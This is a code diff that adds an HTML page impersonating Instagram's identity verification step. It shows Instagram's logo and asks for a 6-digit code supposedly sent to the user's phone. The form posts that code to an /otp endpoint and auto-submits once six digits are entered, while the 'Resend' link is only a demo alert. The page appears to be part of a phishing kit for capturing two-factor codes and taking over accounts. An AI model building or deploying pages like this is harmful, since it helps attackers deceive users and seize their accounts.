@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify Your Identity</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+    body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .container { background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); width: 380px; text-align: center; }
+    .logo { width: 180px; margin-bottom: 24px; }
+    h2 { font-size: 20px; font-weight: 600; color: #262626; margin-bottom: 8px; }
+    .sub { color: #8e8e8e; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+    .otp-input { width: 100%; padding: 14px; font-size: 22px; letter-spacing: 10px; text-align: center; border: 1px solid #dbdbdb; border-radius: 4px; outline: none; }
+    .otp-input:focus { border-color: #0095f6; }
+    .btn { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 16px; }
+    .btn:hover { background: #0080d6; }
+    .resend { margin-top: 20px; font-size: 13px; color: #8e8e8e; }
+    .resend a { color: #0095f6; text-decoration: none; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo" />
+    <h2>🔐 Verify Your Identity</h2>
+    <p class="sub">We sent a 6-digit code to your phone.<br>Enter it below to continue.</p>
+    
+    <!-- ✅ FORM ACTION = /otp -->
+    <form action="/otp" method="POST" id="otpForm">
+      <input type="text" name="otp" class="otp-input" maxlength="6" placeholder="------" inputmode="numeric" pattern="[0-9]*" required autofocus />
+      <button type="submit" class="btn">Verify</button>
+    </form>
+    
+    <div class="resend">
+      Didn't receive code? <a href="#" onclick="alert('✅ Resend OTP (demo)')">Resend</a>
+    </div>
+  </div>
+  <script>
+    // Auto-submit when 6 digits entered
+    document.querySelector('.otp-input').addEventListener('input', function(e) {
+      if (this.value.length === 6) {
+        document.getElementById('otpForm').submit();
+      }
+    });
+  </script>
+</body>
+</html>
